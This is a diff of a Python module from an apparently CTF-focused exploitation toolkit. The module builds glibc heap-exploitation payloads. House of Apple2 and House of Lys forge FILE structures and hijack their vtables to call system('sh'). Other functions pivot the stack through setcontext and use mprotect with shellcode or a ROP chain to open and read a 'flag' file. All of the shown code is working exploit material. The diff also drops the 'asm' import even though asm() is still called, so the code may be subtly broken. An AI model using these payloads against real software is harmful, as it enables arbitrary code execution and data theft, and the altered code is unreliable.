@@ -1,11 +1,11 @@
-from pwn import p64, ELF, asm, flat
-from gadget import *
-from pwnvar import pwnlibc
+from pwn import p64, flat
+from PwnAssistor.attacker.gadget import *
+import PwnAssistor.attacker.pwnvar as pwnvar
 
 
 def house_of_apple2(target_addr: int):
-    jumps = pwnlibc.sym['_IO_wfile_jumps']
-    system = pwnlibc.sym['system']
+    jumps = pwnvar.pwnlibc.sym['_IO_wfile_jumps']
+    system = pwnvar.pwnlibc.sym['system']
     wide_addr = target_addr
     vtable_addr = target_addr
     payload = b'   ;sh'.ljust(8, b'\x00')
@@ -20,6 +20,7 @@ def house_of_apple2(target_addr: int):
     payload = payload.ljust(0xe0, b'\x00')
     payload += p64(vtable_addr)
     return payload
+
 
 def stack_pivot_orw_by_shellcode(target_addr: int, file_name: bytes = b'flag'):
     shellcode = """
@@ -39,8 +40,8 @@ def stack_pivot_orw_by_shellcode(target_addr: int, file_name: bytes = b'flag'):
     """.format(hex(target_addr + 0xb0))
 
     heap_first = target_addr
-    setcontext = pwnlibc.sym['setcontext'] + 61
-    mprotect_addr = pwnlibc.sym['mprotect']
+    setcontext = pwnvar.pwnlibc.sym['setcontext'] + 61
+    mprotect_addr = pwnvar.pwnlibc.sym['mprotect']
     payload = p64(heap_first + 0x28) + p64(heap_first)
     payload = payload.ljust(0x20, b'\x00') + p64(setcontext)
     payload += asm(shellcode)
@@ -52,8 +53,9 @@ def stack_pivot_orw_by_shellcode(target_addr: int, file_name: bytes = b'flag'):
     payload += file_name + b'\x00'
     return payload
 
+
 def house_of_apple2_orw(target_addr: int, file_name: bytes = b'flag', mode: str = 'shellcode'):
-    jumps = pwnlibc.sym['_IO_wfile_jumps']
+    jumps = pwnvar.pwnlibc.sym['_IO_wfile_jumps']
     wide_addr = target_addr
     vtable_addr = target_addr
     magic = get_magic_gadget1()
@@ -87,7 +89,7 @@ def stack_pivot_orw_by_rop(target_addr: int, file_name: bytes = b'flag'):
     syscall_addr = get_syscall()
     ret_addr = get_ret()
     magic_addr = get_magic_gadget1()
-    setcontext_addr = pwnlibc.sym['setcontext'] + 61
+    setcontext_addr = pwnvar.pwnlibc.sym['setcontext'] + 61
     flag_addr = target_addr + 0xe0
 
     payload = p64(0) + p64(target_addr) + p64(0) * 2 + p64(setcontext_addr)
@@ -108,11 +110,11 @@ def house_of_lys(target_addr: int):
             0x20: 0,
             0x28: 1,
             0x30: 0,
-            0x38: pwnlibc.sym["system"],
+            0x38: pwnvar.pwnlibc.sym["system"],
             0x48: target_addr + 0xa0,
             0x50: 1,
             0xa0: 0x68732f6e69622f,
-            0xd8: pwnlibc.sym["_IO_obstack_Jumps"] + 0x20,
+            0xd8: pwnvar.pwnlibc.sym["_IO_obstack_Jumps"] + 0x20,
             0xe0: target_addr
         },
         filler='\x00'
@@ -150,7 +152,7 @@ def house_of_lys_orw(target_addr: int, file_name: bytes = b'flag'):
             0x48: target_addr + 0xe8,
             0x50: 1,
             0xa0: file_name,
-            0xd8: pwnlibc.sym["_IO_obstack_Jumps"] + 0x20,
+            0xd8: pwnvar.pwnlibc.sym["_IO_obstack_Jumps"] + 0x20,
             0xe0: target_addr,
             0xe8: {
                 0x0: gg3,
